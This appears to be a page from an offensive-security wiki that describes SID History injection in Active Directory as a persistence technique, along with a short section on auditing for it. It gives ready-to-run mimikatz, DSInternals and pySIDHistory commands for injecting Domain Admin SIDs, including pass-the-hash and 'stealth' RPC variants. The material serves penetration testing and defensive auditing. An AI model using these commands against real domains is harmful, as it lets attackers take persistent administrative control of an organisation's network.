---
authors: ShutdownRepo, felixbillieres
category: ad
---

# SID History

## Theory

The SID (Security Identifier) is a unique identifier that is assigned to each security principal (e.g. user, group, computer). It is used to identify the principal within the domain and is used to control access to resources.

The SID history is a property of a user or group object that allows the object to retain its SID when it is migrated from one domain to another as part of a domain consolidation or restructuring. When an object is migrated to a new domain, it is assigned a new SID in the target domain. The SID history allows the object to retain its original SID, so that access to resources in the source domain is not lost.

This mechanism can also be abused as a means of persistence: adding the SID of a privileged account or group to the SID-History attribute of a controlled account grants rights associated with account/group of which the SID is added.

For instance, the SID of an account with Domain Admin rights can be added to a normal user SID History to grant them Domain Admin rights (the rights would not be granted per say, but the modified account would be treated as domain admin when checking rights).

## Practice

### Injecting SID History

::: tabs

=== Windows

#### Pre-Windows 2016

Modifying the SID History attribute of an object can be done using mimikatz, with the [`sid::patch`](https://tools.thehacker.recipes/mimikatz/modules/sid/patch), [`sid::add`](https://tools.thehacker.recipes/mimikatz/modules/sid/add) and [`sid::lookup`](https://tools.thehacker.recipes/mimikatz/modules/sid/lookup) commands.

Mimikatz cannot be used on 2016+ domain controllers for that purpose, due to an error with [`sid::patch`](https://tools.thehacker.recipes/mimikatz/modules/sid/patch) ([https://github.com/gentilkiwi/mimikatz/issues/348](https://github.com/gentilkiwi/mimikatz/issues/348))

> [!WARNING]
> Mimikatz must be launched with at least enough privileges to perform the [`privilege::debug`](https://tools.thehacker.recipes/mimikatz/modules/privilege/debug) command (i.e. domain admin or `SYSTEM`).

```powershell
# Generic command
mikikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:UserRecievingTheSID /new:SIDOfTheTargetedUserOrGroup"

# Example 1 : Use this command to inject the SID of built-in administrator account to the SID-History attribute of AttackerUser
mikikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:AttackerUser /new:Builtin\administrators "

# Example 2 : Use sid::lookup to retrieve the SID of an account and inject it to the SID-History attribute of AttackerUser
mikikatz.exe "sid::lookup /name:InterestingUser"
mikikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:AttackerUser /new:SIDOfInterestingUser"
```

#### Post-Windows 2016

The only known way to add a SID to the SID History attribute of an account on a Windows domain controller 2016 and above is to use the Powershell module [DSInternals](https://github.com/MichaelGrafnetter/DSInternals). This method also works for Pre-Windows 2016 domain controllers.

> [!CAUTION]
> The NTDS service must be stopped at some point and restarted for this procedure to work, which can cause various issues. Proceed with care, avoid production systems.

It is necessary to re-enable the `Add-ADDBSidHistory` function, which has been disabled in version [4.15](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/CHANGELOG.md#415---2024-12-23) of DSInternals:

```powershell
# Install DSInternals on the domain controller
Install-Module -Name DSInternals

# Modify the file DSInternals.psd1
notepad.exe (Join-Path (Get-InstalledModule -Name DSInternals | Select-Object -ExpandProperty InstalledLocation) 'DSInternals.psd1')

# Then replace the line "# Intentionally excluded: 'Add-ADDBSidHistory'" with "'Add-ADDBSidHistory'"
```

Then, open a new PowerShell console:

```powershell
# Find the account SID you want to inject
Get-ADUser -Identity $InterestingUser

# Stop the NTDS service
Stop-service NTDS -force

# Inject the SID into the SID History attribute
Add-ADDBSidHistory -samaccountname AttackerUser -sidhistory $SIDOfInterestingUser -DBPath C:\Windows\ntds\ntds.dit -Force

# Start the NTDS service
Start-service NTDS
```

=== UNIX-like

[pySIDHistory](https://github.com/felixbillieres/pySIDHistory) (Python) enables remote SID History injection from Linux-based platforms, without requiring direct access to the domain controller. It supports two injection methods and multiple authentication options.

> [!CAUTION]
> The DSInternals method **stops the NTDS service** on the target DC to modify `ntds.dit` offline, causing a brief authentication outage (~5-10s). **Do not run against production domain controllers.**

#### DSInternals method (default)

Stops NTDS, modifies `ntds.dit` offline via DSInternals, restarts NTDS. Works same-domain and can inject any SID including privileged ones (RID < 1000).

```bash
# Same-domain: inject Domain Admins SID
python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
    --target $TARGET_USER --inject domain-admins --force

# Cross-domain: inject DA from a foreign domain
python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
    --target $TARGET_USER --inject domain-admins --inject-domain $FOREIGN_DOMAIN --force

# Raw SID injection
python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
    --target $TARGET_USER --inject $SID --force
```

#### DRSUAPI method (cross-forest, stealth)

Calls `DRSAddSidHistory` (opnum 20) over RPC. No disk writes, no service, no NTDS downtime. Limited to RID > 1000 due to SID filtering at forest trust boundaries.

```bash
python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
    --target $TARGET_USER --method drsuapi \
    --source-user $SRC_USER --source-domain $SRC_DOMAIN \
    --src-username $SRC_USER --src-password $SRC_PASSWORD --src-domain $SRC_DOMAIN
```

Pass-the-Hash and Kerberos authentication are also supported:

```bash
# Pass-the-Hash authentication
python3 main.py -d $DOMAIN -u $USER --ntlm-hash $NT_HASH --dc-ip $DC_IP \
    --target $TARGET_USER --inject domain-admins --force

# Kerberos authentication
python3 main.py -d $DOMAIN -u $USER --kerberos --ccache $CCACHE --dc-ip $DC_IP \
    --target $TARGET_USER --inject domain-admins --force
```

:::

### Auditing SID History

::: tabs

=== Windows

SID History can be queried using standard AD tools such as PowerShell's `Get-ADUser` cmdlet with the `-Properties SIDHistory` parameter, or through LDAP queries filtering on the `sIDHistory` attribute.

```powershell
Get-ADUser -Filter * -Properties SIDHistory | Where-Object { $_.SIDHistory -ne $null }
```

=== UNIX-like

[pySIDHistory](https://github.com/felixbillieres/pySIDHistory) (Python) can audit SID History across the domain with risk assessment:

```bash
# Query sIDHistory of a specific user
python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP --query $TARGET_USER

# Domain-wide audit with risk assessment
python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP --audit

# JSON export for SIEM integration
python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \
    --audit -o json --output-file audit.json

# Enumerate domain trusts and SID filtering status
python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP --enum-trusts
```

:::

## Resources

[https://github.com/felixbillieres/pySIDHistory](https://github.com/felixbillieres/pySIDHistory)

[https://learn.microsoft.com/en-us/windows/win32/adschema/a-sidhistory](https://learn.microsoft.com/en-us/windows/win32/adschema/a-sidhistory)

[https://attack.mitre.org/techniques/T1134/005/](https://attack.mitre.org/techniques/T1134/005/)

[https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)

[https://forum.winbatch.com/index.php?topic=1545.0](https://forum.winbatch.com/index.php?topic=1545.0)

[https://learn.microsoft.com/en-us/windows/win32/ad/using-dsaddsidhistory#operational-constraints](https://learn.microsoft.com/en-us/windows/win32/ad/using-dsaddsidhistory#operational-constraints)

[https://learn.microsoft.com/en-us/windows/win32/api/ntdsapi/nf-ntdsapi-dsaddsidhistorya](https://learn.microsoft.com/en-us/windows/win32/api/ntdsapi/nf-ntdsapi-dsaddsidhistorya)

[https://secframe.com/blog/a-sidhistory-attack-marching-onto-a-dc/](https://secframe.com/blog/a-sidhistory-attack-marching-onto-a-dc/)

[https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Add-ADDBSidHistory.md](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Add-ADDBSidHistory.md)
